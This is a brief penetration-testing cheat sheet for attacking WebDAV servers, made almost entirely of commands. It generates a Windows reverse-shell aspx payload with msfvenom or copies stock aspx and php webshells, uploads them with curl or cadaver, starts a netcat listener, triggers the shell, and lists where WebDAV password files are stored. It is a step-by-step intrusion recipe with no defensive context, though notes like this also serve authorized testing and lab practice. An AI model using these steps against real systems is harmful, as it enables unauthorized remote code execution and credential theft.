# WebDAV

Port 80

### 1) Connection

    cadaver http://domain.local/webdav

### 2) Exploitation

#### 1. Generate a reverse shell

Windows machine

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx

OR use a webshell instead

    cp /usr/share/webshells/aspx/cmdasp.aspx .

Linux machine

    cp /usr/share/webshells/php/php-reverse-shell.php .

#### 2. Upload payload via WebDAV

    curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>

OR in Cadaver

    put shell.aspx
    put php-reverse-shell.php
    
#### 3. Start the listener

    nc -lvnp 80

#### 4. Trigger the payload

    curl http://$VictimIP/shell.aspx
    
### 3) WebDAV credentials file location

    /var/www/html/webdav/passwd.dav
    /var/www/dav/passwd.dav
